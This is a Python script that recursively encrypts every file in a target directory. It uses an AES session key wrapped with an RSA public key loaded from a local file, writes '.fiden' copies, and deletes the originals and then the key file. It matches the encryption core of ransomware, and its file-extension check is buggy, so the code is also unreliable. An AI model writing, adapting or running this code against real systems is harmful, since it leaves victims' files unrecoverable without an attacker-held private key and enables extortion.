import os
import sys
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP

def encrypt_data(path,file_name,session_key,recipient_key):
    if(os.path.exists(path) == True and os.path.isfile(path+'/'+file_name) == True):
        # open the file that been encrypt
        rename_str = path+'/'+file_name+".fiden"
        file_source = open(path+'/'+file_name, "rb")
        file_out = open(rename_str, "wb")
        data = file_source.read()
        
        # Encrypt the session key with the public RSA key
        cipher_rsa = PKCS1_OAEP.new(recipient_key)
        file_out.write(cipher_rsa.encrypt(session_key))

        # Encrypt the data with the AES session key
        cipher_aes = AES.new(session_key, AES.MODE_EAX)
        ciphertext, tag = cipher_aes.encrypt_and_digest(data)
        [ file_out.write(x) for x in (cipher_aes.nonce, tag, ciphertext) ]
        file_out.close()
        file_source.close()
        os.remove(path+'/'+file_name)
        
def get_session_key():
    status = 0
    try:
        session_key = get_random_bytes(16)
        recipient_key = RSA.import_key(open("./en/object.dump").read())
        os.remove("./en/object.dump")
    except OSError as err:
        status = 2
    except FileNotFoundError:
        status = 3
    except:
        status = 4
        
    return [session_key,recipient_key,status]

def start_encrypt_walk_file(main_path):
    session_key,recipient_key,status = get_session_key()
    if(status == 0 and os.path.exists(main_path) and os.path.isdir(main_path)):
        for dirPath, dirNames, fileNames in os.walk(main_path):
            for f in fileNames:
                if(len( f ) < 6 or (len( f ) >= 6 and f[:-6] != ".fiden")):
                    encrypt_data(dirPath,f,session_key,recipient_key)
    return status
    
def start_encrypt_file(main_path,file_name):
    session_key,recipient_key,status = get_session_key()
    if(status == 0):
        encrypt_data(main_path,file_name,session_key,recipient_key)
    return status

def main():
    status = 0
    if(len(sys.argv) == 2):
        main_path = sys.argv[1]
        status = start_encrypt_walk_file(main_path)
    elif(len(sys.argv) == 3):
        main_path = sys.argv[1]
        file_name = sys.argv[2]
        status = start_encrypt_file(main_path,file_name)
    else:
        status = 1
    return status

if __name__ == "__main__":
    # execute only if run as a script
    sys.exit(main())